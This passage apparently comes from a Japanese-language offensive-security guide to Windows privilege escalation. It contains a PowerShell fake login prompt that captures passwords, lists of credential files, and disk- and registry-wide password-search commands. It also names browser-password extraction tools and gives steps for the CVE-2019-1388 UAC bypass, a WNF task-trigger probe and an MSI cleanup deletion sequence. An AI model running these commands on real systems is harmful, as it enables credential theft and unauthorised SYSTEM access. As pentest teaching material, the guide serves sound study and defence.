$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **認証情報を含む可能性のあるファイル名**

以前、**パスワード**が**平文**または**Base64**で含まれていた既知のファイル】【。

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

#### Password Safe拡張子なしのファイル名リスト版

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password Safe v3 のデータベースでは、一般に `.psafe3` 拡張子が使われます。一致するファイル名は暗号化された vault の候補として扱ってください。そのファイルが存在しても、読み取り、ロック解除、保存された認証情報の利用が可能とは限りません。このようなファイルの保存場所を確認する際は、アクセス可能なユーザープロファイルと、設定済みのファイル共有ルートを調べてください。

読み取り可能な KeePass `.kdbx` も、暗号化された vault の手掛かりにすぎません。ロック解除には、実際のマスターパスワードと、設定されているキーファイルやアカウント要素が必要です。承認されたレビューでエントリ内に LM:NT ハッシュのペアが見つかった場合は、[pass-the-hash](../ntlm/README.md#pass-the-hash) を検討する前に、記載されたアカウントと、NT ハッシュが現在も有効で、対象の NTLM サービスに受け入れられることを確認してください。vault のエントリだけで Administrator や SYSTEM の権限が得られるわけではありません。リモートサービスへのアクセス、アカウント権限、および別途必要となるサービス実行手順も満たす必要があります。インベントリには vault のパスと読み取り可否を記録し、データベースや保存された認証情報を出力しないでください。

提案されたファイルをすべて検索してください。

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

#### Password Safe 拡張機能を使用しない検索コマンドのバリエーション

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### ごみ箱内の認証情報

ごみ箱も確認し、認証情報が含まれていないか調べてください。

アクセス可能なごみ箱のエントリを確認し、削除されたバックアップや設定アーカイブのほか、名前に認証情報が明記されているファイルを探します。有用な `.7z`、`.zip`、`.rar` のバックアップは、数か月前のもので、一般的なファイル名が付いている場合もあります。Windows は元のパスと削除日時を `$I` レコードに保存し、削除されたファイルを対応する `$R` エントリとして保存します。アーカイブを開く前に、メタデータと現在の ID による読み取り権限を確認してください。表示されるかどうかはボリューム、ユーザー SID、ファイル権限によって異なるため、一覧が空でも復元可能なバックアップが存在しないとは限りません。アーカイブ名は確認候補として扱い、有効な秘密情報が含まれている証拠とは見なさないでください。

アクセス可能な削除済み `.pfx` ファイルは、**コード署名**に関する手掛かりにもなり得ます。アクセス可能な秘密鍵が含まれていれば、その鍵で変更した PowerShell スクリプトに署名できます。[PowerShell では秘密鍵を持つコード署名証明書が必要です](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature)。また、[AppLocker の発行元ルールでは、署名者の ID とルールの適用範囲が評価されます](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker)。アカウントをまたいで実行するには、現在の ID に対象スクリプトそのものを変更する権限があり、結果の署名をスクリプトと対象アカウントに対して受け入れる有効なルールがあり、さらに、より高い権限で実際にそのスクリプトを実行するスケジュールされたタスクなどが必要です。`.pfx` のファイル名、証明書のサブジェクト、またはスクリプトへの書き込み権限だけでは、この一連の条件が満たされているとは言えません。秘密鍵の内容を開いたり、タスクを実行したりする前に、メタデータ、ACL、ポリシー、スケジュールされたコマンドを確認してください。

アクセス可能なメッセージングクライアントのプロファイルデータベース、メモ、受信ファイルも確認し、認証情報の手掛かりを探してください。BitLocker の回復キーのエクスポートファイルは HTML または TXT 形式で保存されていることがあり、名前の付いたバックアップアーカイブに含まれている場合もあります。そのようなデータから、古いバックアップを含む別の暗号化データボリュームにアクセスできることがあります。アクセスが許可されている場合に限り、そのボリュームとアーカイブを確認してください。バックアップに `NTDS.dit` が含まれている場合、オフラインでドメイン認証情報を復元するには、[バックアップと特権グループのワークフロー](../active-directory-methodology/privileged-groups-and-token-privileges.md)で説明されているように、対応する `SYSTEM` ハイブも必要です。ファイル名やロックされたボリュームだけでは、利用可能な回復キーやドメインバックアップが存在するとは言えません。

複数のプログラムに保存された**パスワードを復元する**には、次を利用できます：[http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### レジストリ内

**認証情報を含む可能性のあるその他のレジストリキー**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ブラウザーの履歴

**Chrome または Firefox** のパスワードが保存されている dbs を確認してください。\
**Chrome、Edge、または Firefox** のパスワードが保存されている dbs を確認してください。\
また、ブラウザーの履歴、ブックマーク、お気に入りも確認してください。そこに**パスワードが保存されている**可能性があります。

現在のユーザーが通常使用する Edge の **Default** プロファイルでは、`Login Data` は `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default` にあり、`Local State` は親ディレクトリの `User Data` にあります。[Microsoft は既定のプロファイルの場所をドキュメント化しています](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars)。別のプロファイルや `UserDataDir` ポリシーによって場所が変わることがあります。ファイルが存在することは、認証情報ストアの手がかりにすぎません。ファイルを読み取れること、該当ユーザーの DPAPI コンテキストまたはその他の認可されたキー素材があること、保存されたログイン情報がより高い権限を持つアカウントのものかどうかを確認してください。パスのみの列挙であれば、データベースを開いたり、復号したパスワードを出力したりする必要はありません。

Firefox について、[Mozilla は](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile)プロファイル内の `key4.db` と `logins.json` が対となるキーおよび暗号化されたログイン情報のファイルであると説明しています。これらのファイルの存在は手がかりにすぎません。両方のファイルを読み取れるか、保存されたエントリがあるか、認証情報を利用できると結論づける前に Primary Password がキーを保護しているかを確認してください。復元した認証情報がドメインアカウントのものなら、そのアカウントの実効的なグループ制御権限と、そのグループの [LAPS パスワードの読み取りまたは復号権限](../active-directory-methodology/laps.md)を個別に確認してください。ブラウザーのアーティファクトだけでは、管理者権限への経路があるとは判断できません。

ブラウザーからパスワードを抽出するツール:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** は Windows オペレーティングシステムに組み込まれた技術で、異なる言語で作られたソフトウェアコンポーネント間の**相互通信**を可能にします。各 COM コンポーネントは **class ID (CLSID)** で識別され、各コンポーネントは **interface ID (IID)** で識別される1つ以上のインターフェースを通じて機能を公開します。

COM クラスとインターフェースは、それぞれレジストリの **HKEY\CLASSES\ROOT\CLSID** と **HKEY\CLASSES\ROOT\Interface** に定義されています。このレジストリは **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** を結合して作成されます = **HKEY\CLASSES\ROOT.**

このレジストリの CLSID 内には、**デフォルト値**が **DLL** を指し、**ThreadingModel** という値が含まれる子レジストリ **InProcServer32** があります。ThreadingModel の値は **Apartment** (Single-Threaded)、**Free** (Multi-Threaded)、**Both** (Single or Multi)、または **Neutral** (Thread Neutral) です。

![ブラウザーの履歴 - COM DLL Overwriting: このレジストリの CLSID 内には、デフォルト値が DLL を指し、値...を含む子レジストリ InProcServer32 があります](<../../images/image (729).png>)

基本的に、実行される **DLL を上書き**でき、その DLL が別のユーザーによって実行される場合、**権限昇格**が可能です。

攻撃者が COM Hijacking を永続化の手段としてどのように利用するかについては、こちらを確認してください:


{{#ref}}
com-hijacking.md
{{#endref}}

### **ファイルとレジストリ内の汎用パスワード検索**

**ファイルの内容を検索する**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**特定のファイル名を持つファイルを検索する**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**レジストリでキー名とパスワードを検索する**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### パスワードを検索するツール

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) は、私が作成した **msf** plugin で、victim 内の credentials を検索するすべての Metasploit POST module を**自動実行**します。\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) は、このページで紹介されているパスワードを含むすべてのファイルを自動検索します。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) は、システムからパスワードを抽出するためのもう1つの優れたツールです。

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) は、データを平文で保存する複数のツール（PuTTY、WinSCP、FileZilla、SuperPuTTY、RDP）の **sessions**、**usernames**、**passwords** を検索します。

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## 漏洩したハンドル

**SYSTEM として実行中のプロセスが、フルアクセスで新しいプロセスを開く**（`OpenProcess()`）とします。同じプロセスが、**メインプロセスのすべてのオープンハンドルを継承する、低い権限の新しいプロセスも作成**します（`CreateProcess()`）。\
その後、**低い権限のプロセスにフルアクセスできる**場合、`OpenProcess()` で作成された**特権プロセスへのオープンハンドル**を取得し、**shellcode を注入**できます。\
[この脆弱性の**検出と悪用方法**について、こちらの例を参照してください。](leaked-handle-exploitation.md)\
[権限レベルの異なるプロセスやスレッドから継承された、より多くのオープンハンドル（フルアクセスに限りません）のテストと悪用方法について、より詳しく説明した**こちらの投稿**も参照してください。](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe クライアントの偽装

**パイプ**と呼ばれる共有メモリセグメントにより、プロセス間の通信とデータ転送が可能になります。

Windows には **Named Pipes** と呼ばれる機能があり、異なるネットワーク間であっても、無関係なプロセス同士でデータを共有できます。これはクライアント/サーバーアーキテクチャに似ており、役割は **named pipe server** と **named pipe client** として定義されます。

**クライアント**がパイプ経由でデータを送信すると、パイプを設定した**サーバー**は、必要な **SeImpersonate** 権限を持っていれば、**クライアントの ID を偽装**できます。偽装可能なパイプを介して通信する**特権プロセス**を特定できれば、自分が確立したパイプとそのプロセスがやり取りした際に、そのプロセスの ID を採用して**より高い権限を得る**機会になります。この攻撃の実行手順については、[**こちら**](named-pipe-client-impersonation.md)と[**こちら**](#from-high-integrity-to-system)のガイドを参照してください。

また、以下のツールを使うと、Burp のようなツールで **named pipe の通信を傍受**できます：[**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept)。さらに、**privesc のためにすべての pipe を一覧表示して確認できる**ツールもあります：[**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv のリモート DWORD 書き込みから RCE へ

Telephony サービス（TapiSrv）はサーバーモードで `\\pipe\\tapsrv`（MS-TRP）を公開します。リモートの認証済みクライアントは、mailslot ベースの非同期イベント経路を悪用して、`ClientAttach` を `NETWORK SERVICE` が書き込み可能な既存ファイルへの任意の**4バイト書き込み**に利用できます。その後、Telephony の管理者権限を取得し、任意の DLL をサービスとして読み込ませます。全体の流れは次のとおりです。

- `pszDomainUser` に書き込み可能な既存パスを設定して `ClientAttach` を実行すると、サービスは `CreateFileW(..., OPEN_EXISTING)` でそのファイルを開き、非同期イベントの書き込みに使用します。
- 各イベントは、`Initialize` で指定した攻撃者制御の `InitContext` をそのハンドルに書き込みます。`LRegisterRequestRecipient`（`Req_Func 61`）で line app を登録し、`TRequestMakeCall`（`Req_Func 121`）をトリガーして、`GetAsyncEvents`（`Req_Func 0`）で取得した後、登録解除またはシャットダウンすることで、決定論的な書き込みを繰り返せます。
- `C:\Windows\TAPI\tsec.ini` の `[TapiAdministrators]` に自分を追加して再接続し、任意の DLL パスを指定して `GetUIDllName` を呼び出すと、`NETWORK SERVICE` として `TSPI_providerUIIdentify` を実行できます。

詳細：

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## その他

### Windows で実行される可能性のあるファイル拡張子

**[https://filesec.io/](https://filesec.io/)** を確認してください。

### Markdown レンダラーを介した Protocol handler / ShellExecute の悪用

`ShellExecuteExW` に渡されるクリック可能な Markdown リンクは、危険な URI handler（`file:`、`ms-appinstaller:`、または登録済みの任意の scheme）を起動し、現在のユーザーとして攻撃者制御のファイルを実行する可能性があります。詳細：

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **パスワードを探すためのコマンドラインの監視**

ユーザーとして shell を取得した場合、**コマンドラインに認証情報を渡して**実行されるスケジュールタスクやその他のプロセスが存在することがあります。以下のスクリプトは2秒ごとにプロセスのコマンドラインを取得し、現在の状態と前回の状態を比較して、差分を出力します。

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## プロセスからパスワードを盗む

## 低権限ユーザーから NT\AUTHORITY SYSTEM へ (CVE-2019-1388) / UAC Bypass

グラフィカルインターフェース（コンソールまたは RDP 経由）にアクセスでき、UAC が有効な場合、Microsoft Windows の一部のバージョンでは、権限のないユーザーから「NT\AUTHORITY SYSTEM」としてターミナルやその他のプロセスを実行できます。

これにより、同じ脆弱性を利用して、権限昇格と UAC のバイパスを同時に実行できます。さらに、何もインストールする必要はなく、このプロセスで使用するバイナリは Microsoft によって署名、発行されています。

影響を受けるシステムには、以下のものがあります。

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

この脆弱性を悪用するには、次の手順を実行する必要があります：

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

必要なファイルと情報は、次の GitHub リポジトリにあります。

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Administrator Medium から High Integrity Level への昇格 / UAC Bypass

**Integrity Levels**について学ぶには、こちらを読んでください。


{{#ref}}
integrity-levels.md
{{#endref}}

次に、**UAC と UAC bypasses**について学ぶには、こちらを読んでください。


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Served Root 内への Upload Directory Junctions

アプリケーションが予測可能なアップロード用サブディレクトリを作成し、呼び出し元が指定したファイル名でそこにファイルを書き込み、その後、そのファイルを処理することがあります。サーバー側での書き込み前に、低権限ユーザーがそのサブディレクトリを削除し、NTFS junction に置き換えられる場合、書き込みが junction をたどって、Web サーバーが公開するディレクトリに到達する可能性があります。サーバーがそのファイル形式を実行する場合、そこに置かれたスクリプトは Web サービスの実行 ID で実行される可能性があります。これはアプリケーション固有の任意書き込みの境界であり、書き込み可能なアップロードディレクトリや既存の junction があるだけでは、脆弱性の証明にはなりません。

アップロードハンドラーにおける正確なパスの構築方法とタイミング、サブディレクトリに対するユーザーの実効的な削除・作成権限、宛先の実効 ACL、書き込み元が reparse point をたどるかどうか、宛先で Web サーバーがファイルを実行するかどうかを確認してください。書き込み元と Web サーバーのプロセス ID は、それぞれ別々に確認してください。受動的なインベントリではディレクトリの ACL や reparse メタデータを確認できますが、ハンドラーの動作や、将来 junction が置き換えられることまでは確認できません。サービスアカウントで実行される場合は、別の token-privilege 経路を検討する前に、**実際のプロセストークン**を調べてください。

## WNF-triggered な特権 Scheduled Task のクリーンアップ

手動実行を拒否する scheduled task でも、権限のないユーザーが起動できるトリガーが存在することがあります。特権タスクを監査する際は、XML をエクスポートし、タスクの DACL、principal、action だけでなく、**すべての**トリガーを確認してください。特に、`WnfStateChangeTrigger` は Windows Notification Facility（WNF）の state を指定します。その保護可能な state で現在のユーザーによる更新の publish が許可されている場合、`<AllowStartOnDemand>false</AllowStartOnDemand>` の設定にかかわらず、ユーザーはそのタスクに設定された ID で間接的にタスクを起動できます。<sup>[[43]](#references)</sup>

たとえば Recall の `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` タスクは SYSTEM として実行され、標準ユーザーからの WNF state `7508BCA32C079E41` への更新を受け付け、その後、Recall が無効になっていても `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}` を調べていました。<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

到達可能性をテストするには、`ntdll.dll` から `ZwUpdateWnfStateData` を解決し、8 バイトの state name に空の更新を送信して、戻り値のステータスをタスクの最終実行データまたは Procmon のアクティビティと照合します。以下の簡略化したプローブでは、Recall タスクの例で使われているバイト列を使用しています。テスト対象のタスク用にエクスポートされたバイト列に置き換えてください。<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### 再帰的なクリーンアップを特権削除に利用する

有用なプリミティブはトリガー単独ではなく、攻撃者が制御するディレクトリを受け取る特権クリーンアップルーチンです。列挙から最終的な変更までの処理を追跡してください。プロファイル／セッションの検出、ワイルドカードで選択される子要素、`SHCreateItemFromParsingName`、`IFileOperation::DeleteItem` は、事前に確認されたパス名が後で再帰的にたどられることを示す強い兆候です。子孫が信頼できるディレクトリハンドルを基準に開かれ、削除前に検証されない場合、攻撃者は列挙から使用までの間に解決先を変更できます。<sup>[[43]](#references)</sup>

WNFトリガーを、後述する[oplock、junction、Object Manager symlinkによる置換](#from-folder-contents-delete-to-system-eop)と組み合わせます。oplockによって、正規の子要素を選択した後にクリーナーを一時停止させ、その間に書き込み可能な祖先を置き換えます。すると再開後、特権削除処理は `\RPC Control` 経由で保護対象を解決します。Recallの攻撃チェーンでは、これにより、文書化されたMSI rollback手法に必要な `C:\Config.Msi` のSYSTEM権限による削除が実現しました。<sup>[[31]](#references)[[43]](#references)</sup>

### 入れ子の子孫による浅いreparse point対策の回避

攻撃者が制御するルートとその直下の子要素だけを検証しても、パス名ベースの再帰的な削除は安全になりません。検証済みのオブジェクトは正規のままにしておき、junction／oplockによる置換をその下の追加の子要素に移します。すると、`IFileOperation::DeleteItem` は最終的に未検証の子孫に到達し、新たなターゲットをたどります。CVE-2026-20941は、最初のRecallパッチで `UKP` とGUID形式のディレクトリを検証した一方、従来の再帰的な削除処理を残したことで、まさにこの種の不完全な修正から発生しました。<sup>[[43]](#references)</sup>

安全なパターンは、**すべての子孫**を、すでに信頼されているディレクトリハンドルを基準に開き、最終的に解決されたパス／オブジェクトを取得して検証し、その検証済みハンドルに対して削除の処理を適用することです。プレフィックスを検証した後、パス名ベースの再帰的な削除処理に戻ってはいけません。パッチレビューでは、実際の呼び出し箇所での構造体も確認してください。このケースでは、`NtCreateFile` における `OBJECT_ATTRIBUTES` を実行時に調査したところ、`RootDirectory` が非NULLで、相対名が `{GUID}\\secure_file.lock` であることが判明し、2つ目の `FILE_DELETE_ON_CLOSE` プリミティブがあると示唆する誤解を招く逆コンパイラー出力が否定されました。<sup>[[43]](#references)</sup>

## 任意のフォルダー削除／移動／名前変更からSYSTEM EoPへ

この手法は[**このブログ記事**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)で解説されており、exploitコードは[**こちらで入手できます**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)。<sup>[[31]](#references)[[32]](#references)</sup>

この攻撃は基本的に、Windows Installerのrollback機能を悪用し、アンインストール処理中に正規のファイルを悪意のあるファイルに置き換えます。そのために、攻撃者は**悪意のあるMSIインストーラー**を作成し、これを使って `C:\Config.Msi` フォルダーを乗っ取ります。このフォルダーは後にWindows Installerが他のMSIパッケージのアンインストール中にrollbackファイルを保存するために使用し、そのrollbackファイルに悪意のあるpayloadを含むよう改変します。

### Windows Installer COMのクリーンアップパス注入（CVE-2025-27727）

低い権限のクライアントは、`CMsiConfigurationManager` COMオブジェクト（CLSID/IID `{000C101C-0000-0000-C000-000000000046}`）を介して、SYSTEM権限で動作する `msiexec.exe` サービスにアクセスできます。リバースエンジニアリングにより、関連する `IMsiServer` 呼び出しは、vtableオフセット `0xA0` の `MsiBeginTransactionW`、`0xC8` の `SetEEUIDirectoryAndFilter`、`0x50` の `CleanupTempPackages` であることが特定されました。これらの名前とオフセットはリバースエンジニアリングによるもので、ビルドによって異なる場合があります。<sup>[[41]](#references)</sup>

非管理者の場合、`SetEEUIDirectoryAndFilter` は、指定されたパスを `DELETE`、`FILE_FLAG_BACKUP_SEMANTICS`、`FILE_FLAG_OPEN_REPARSE_POINT` を指定して開く間だけ呼び出し元を偽装します。これにより、呼び出し元がディレクトリを削除できることと、reparse pointをたどらないことは確認されますが、確認したファイルオブジェクトが後続のクリーンアップに結び付けられるわけではなく、そのファイルがWindows Installerによって作成されたことも証明されません。<sup>[[41]](#references)</sup>

`MsiBeginTransactionW` の後、`SetEEUIDirectoryAndFilter` は、呼び出し元のfilter引数に関係なく、パスをフォルダーとして登録します。サービスは `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages` の下に名前付きの `REG_DWORD` 値を書き込みます。値の名前は呼び出し元が制御するパスで、データ `0x00000002` はフォルダーフラグです。続いて `CleanupTempPackages(NULL, FALSE)` がクリーンアップ処理を直接開始します。昇格されたワーカーはレジストリ値を列挙し、フォルダーのエントリをパスの出所を検証せずに再帰的な `FDeleteFolder` に渡します。通常の削除に失敗すると、コードは `LockdownPath` も呼び出し、ファイル属性をクリアして再試行します。<sup>[[41]](#references)</sup>

`msi.dll` から復元された最小限の呼び出しシーケンスは次のとおりです。<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

有用な primitive は junction によるリダイレクトではなく、パスの再利用です。攻撃者が作成した `C:\Config.Msi` を登録して削除し、その後 Windows Installer に同じパス名を保護された rollback データとともに再作成させます。Cleanup は古い `TempPackages` の名前を信頼し、新しいディレクトリを SYSTEM として削除します。reparse point は不要なため、これは `FILE_FLAG_OPEN_REPARSE_POINT` と redirection-trust mitigation が意図する境界を回避します。<sup>[[41]](#references)</sup>

